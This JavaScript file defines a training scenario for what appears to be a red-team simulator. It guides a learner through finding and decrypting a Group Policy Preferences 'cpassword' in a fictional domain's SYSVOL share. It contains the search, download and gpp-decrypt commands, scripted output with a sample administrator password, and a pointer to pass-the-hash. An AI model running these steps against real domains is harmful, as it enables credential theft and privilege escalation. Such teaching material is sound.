/**
 * Mission 3B: GPP Passwords (Misconfiguration)
 *
 * This scenario simulates finding a password stored in
 * Group Policy Preferences.
 *
 * THIS SCENARIO ASSUMES:
 * 1. The user has compromised 'svc_backup' credentials from
 * the AS-REP Roasting mission.
 */

export const gppScenario = {
  id: 'gpp-passwords',
  title: 'GPP Passwords: CPassword Hunting',
  description: 'Find and decrypt a password stored in a Group Policy Preferences (GPP) XML file in SYSVOL.',
  difficulty: 'Intermediate',

  network: {
    attacker: {
      ip: '10.0.0.5',
      hostname: 'kali-attacker',
      role: 'Red Team Machine'
    },
    target: {
      ip: '10.0.1.10',
      hostname: 'DC01.contoso.local',
      role: 'Domain Controller'
    },
    domain: 'contoso.local'
  },

  guide: {
    overview: `**Group Policy Preferences (GPP)** was a feature used by admins to set configurations, including local account passwords. For years, these passwords were stored in an XML file in SYSVOL (readable by all users) and encrypted with a publicly known AES key.

**Attack Flow:**
1.  Use compromised credentials to search the SYSVOL share for XML files containing 'cpassword'.
2.  Download the discovered 'Groups.xml' file.
3.  Read the file to find the 'cpassword' value.
4.  Use a decryption tool (like gpp-decrypt) to get the plaintext password.

**Why This Matters:**
This is a common misconfiguration that allows any domain user to escalate privileges to a local administrator on many machines.`,
    steps: [
      {
        number: 1,
        title: 'Search SYSVOL',
        description:
          'Use your compromised "svc_backup" credentials (from AS-REP Roasting) to search the "contoso.local" SYSVOL share for any "Groups.xml" files.',
        command: 'dir \\\\contoso.local\\SYSVOL\\Policies\\*Groups.xml /s',
        tip:
          'SYSVOL is readable by all authenticated users. /s makes the directory search recursive.'
      },
      {
        number: 2,
        title: 'Download the XML File',
        description:
          'You found one! Download the "Groups.xml" file from that long directory path.',
        command:
          'download \\\\contoso.local\\SYSVOL\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE\\Preferences\\Groups\\Groups.xml',
        tip: 'This will add the file to your "Files" tab.'
      },
      {
        number: 3,
        title: 'Find the "cpassword"',
        description:
          'Read the "Groups.xml" file from your "Files" tab to find the "cpassword" value.',
        command:
          'cat Groups.xml',
        tip: 'Look for the cpassword attribute in the XML output.'
      },
      {
        number: 4,
        title: 'Decrypt the Password',
        description:
          'You found the encrypted password. Use "gpp-decrypt" to get the plaintext!',
        command: 'gpp-decrypt j1Uj....[cpassword-value]....E=',
        tip: 'The AES key for GPP is public knowledge.'
      },
      {
        number: 5,
        title: 'Credentials Obtained',
        description:
          'Success! The local administrator password is now in your "Files" tab.',
        command: null,
        tip:
          'This password is likely reused on many servers in the domain.'
      }
    ]
  },

  // Simulation steps executed in the terminal
  steps: [
    {
      id: 1,
      expectedCommand: 'dir \\\\contoso.local\\sysvol\\policies\\*groups.xml /s',
      attackerOutput: [
        '[*] Searching SYSVOL share...',
        ' Volume in drive \\\\contoso.local\\SYSVOL is SYSVOL',
        ' Volume Serial Number is XXXX-XXXX',
        '',
        ' Directory of \\\\contoso.local\\SYSVOL\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE\\Preferences\\Groups',
        '',
        '10/28/2014  01:30 PM            1,204   Groups.xml',
        '               1 File(s)          1,204 bytes',
        '',
        '     Total Files Listed:',
        '               1 File(s)          1,204 bytes'
      ],
      serverOutput: [
        '[SMB] User "CONTOSO\\svc_backup" connected to SYSVOL share.',
        '[SMB] File search request: *Groups.xml',
        '[AUDIT] File access on SYSVOL by svc_backup.'
      ],
      delay: 500,
      // Create the file in the "virtual" file system so the user can download it.
      lootToGrant: {
        files: {
          '\\\\contoso.local\\sysvol\\policies\\{31b2f340-016d-11d2-945f-00c04fb984f9}\\machine\\preferences\\groups\\groups.xml': {
            content: '<Groups clsid="...">\n  <User ...>\n    <Properties ... cpassword="j1Uj/sA/kYpIrA4A9x7ySIVb1kH15cE/Ld81i3Vb1uU" ... />\n  </User>\n</Groups>',
            size: '1.2 KB'
          }
        }
      }
    },
    {
      id: 2,
      expectedCommand: 'download \\\\contoso.local\\sysvol\\policies\\{31b2f340-016d-11d2-945f-00c04fb984f9}\\machine\\preferences\\groups\\groups.xml',
      attackerOutput: [
        '[*] Downloading "Groups.xml"...',
        '[+] File "Groups.xml" (1.2 KB) downloaded successfully.',
        '[+] File added to your "Files" tab.'
      ],
      serverOutput: [
        '[SMB] File download: Groups.xml by svc_backup.',
        '[AUDIT] Potential exfiltration of GPO files.'
      ],
      delay: 400,
      // This step moves the file to the user's "Files" tab
      lootToGrant: {
        download: [{ id: 'gpp', name: 'Groups.xml', size: '1.2 KB' }]
      }
    },
    {
      id: 3,
      expectedCommand: 'cat groups.xml',
      attackerOutput: [
        '<?xml version="1.0" encoding="utf-8"?>',
        '<Groups clsid="{...}">',
        '  <User clsid="{...}" name="LocalAdmin" action="U" ...>',
        '    <Properties ... userName="LocalAdmin" ... cpassword="j1Uj/sA/kYpIrA4A9x7ySIVb1kH15cE/Ld81i3Vb1uU" ... />',
        '  </User>',
        '</Groups>'
      ],
      serverOutput: [
        '[SYSTEM] No network activity (local file read).'
      ],
      delay: 100
    },
    {
      id: 4,
      expectedCommand: 'gpp-decrypt j1Uj/sA/kYpIrA4A9x7ySIVb1kH15cE/Ld81i3Vb1uU',
      attackerOutput: [
        '[*] Decrypting GPP "cpassword"...',
        '[+] Password Decrypted: P@ssw0rd99!',
        '[+] This is the password for the "LocalAdmin" account.'
      ],
      serverOutput: [
        '[SYSTEM] No network activity (offline decryption).'
      ],
      delay: 500,
      // This step adds the new password to the "Files" tab
      lootToGrant: {
        creds: [
          { type: 'Password', username: 'LocalAdmin', secret: 'P@ssw0rd99!' }
        ]
      }
    },
    {
      id: 5,
      expectedCommand: null,
      attackerOutput: [
        '',
        '[+] ============================================',
        '[+] GPP Password Attack Complete',
        '[+] ============================================',
        '[+] Credentials Found: 1',
        '[+] User: LocalAdmin',
        '[+] Pass: P@ssw0rd99!',
        '[+] ============================================',
        '[*] Next Steps:',
        '[*] 1. Use these credentials to Pass-the-Hash or login to other machines.',
        '',
        '[+] Attack successful! 🎯'
      ],
      serverOutput: [
        '[AUDIT] Attacker has extracted plaintext administrator credentials.'
      ],
      delay: 400
    }
  ]
};

export default gppScenario;